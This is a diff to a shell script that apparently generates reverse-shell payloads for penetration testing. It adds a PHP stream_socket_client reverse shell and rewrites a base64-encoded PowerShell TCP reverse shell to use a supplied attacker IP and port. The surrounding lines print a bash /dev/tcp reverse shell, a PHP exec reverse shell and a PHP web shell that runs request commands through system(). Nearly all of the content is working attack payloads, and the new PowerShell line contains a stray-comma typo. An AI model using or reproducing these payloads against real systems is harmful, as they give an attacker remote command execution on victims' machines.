@@ -24,10 +24,11 @@ if [[ "$1" == "bash" ]]; then
     echo -e "\t${YELLOW}-${ENDCOLOR} bash -c 'bash -i >& /dev/tcp/$IP/$2 0>&1'"
 
 elif [[ "$1" == "php" ]]; then
-    echo -e "\n${BLUE}[+]${ENDCOLOR} Php shell payloads generated:\n"
+    echo -e "\n${BLUE}[+]${ENDCOLOR} PHP shell payloads generated:\n"
 
     echo -e "\t${YELLOW}-${ENDCOLOR} <?php if(isset(\$_REQUEST[\"cmd\"])){ echo \"<pre>\"; \$cmd = (\$_REQUEST[\"cmd\"]); system(\$cmd); echo \"</pre>\"; die; }?>"
     echo -e "\t${YELLOW}-${ENDCOLOR} <?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$IP/$2 0>&1'\");"
+    echo -e "\t${YELLOW}-${ENDCOLOR} <?php \$s = stream_socket_client(\"tcp://$IP:$2\"); proc_open(\"/bin/sh -i\", [0=>\$s,1=>\$s,2=>\$s],\$pipes);?>"
 
 elif [[ "$1" == "nc" ]]; then
     echo -e "\n${BLUE}[+]${ENDCOLOR} Netcat reverse shell payloads generated:\n"
@@ -42,7 +43,7 @@ elif [[ "$1" == "powershell" ]]; then
     echo -e "\n${BLUE}[+]${ENDCOLOR} PowerShell reverse shell payloads generated:\n"
 
     # shellcheck disable=SC2016
-    payload=$(echo -n '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.44",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
+    payload=$(echo -n "\$client = New-Object System.Net.Sockets.TCPClient(\"$IP\",$2);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$,bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
     echo -e "\t${YELLOW}-${ENDCOLOR} powershell -e $payload"
 
 else
